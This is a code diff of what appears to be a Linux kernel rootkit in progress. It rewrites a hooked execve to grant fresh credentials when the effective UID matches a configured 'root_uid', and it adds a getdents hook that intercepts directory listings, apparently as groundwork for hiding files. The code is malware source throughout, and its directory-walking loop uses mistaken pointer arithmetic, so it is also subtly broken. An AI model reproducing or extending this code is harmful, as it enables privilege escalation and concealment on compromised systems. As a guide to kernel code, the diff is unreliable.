@@ -336,8 +336,7 @@ asmlinkage int new_execve(const char *filename, char *const argv[],
   printk(KERN_INFO "Executing %s\n", filename);
   printk(KERN_INFO "Effective UID before switch %d\n", current_euid());
 
-  // TODO Need to make this conditional based on passed in UID
-  if (1) {
+  if (current_euid() == root_uid) {
     struct cred *new_cred = prepare_creds();  
 
     if (new_cred != NULL) {
@@ -359,6 +358,23 @@ asmlinkage int new_execve(const char *filename, char *const argv[],
 asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp,
                             unsigned int count)
 {
-  //TODO
-  return 0; // TODO Temp
+  int (*orig_func)(unsigned int fd, linux_dirent *dirp, unsigned int count);
+  t_syscall_hook *getdents_hook;
+  int ret_val = 0, bpos = 0;
+  linux_dirent *curr = NULL;
+
+  printk(KERN_INFO "getdents() hook invoked.\n");
+
+  getdents_hook = find_syscall_hook(__NR_getdents);
+  orig_func = (void*) getdents_hook->orig_func;
+
+  ret_val = orig_func(fd, dirp, count);
+
+  for (bpos = 0; bpos < ret_val; ) {
+    curr = (linux_dirent*) (dirp + bpos);
+    printk(KERN_INFO "entry: %s\n", curr->d_name);
+    bpos += curr->d_reclen;
+  }
+
+  return ret_val;
 }
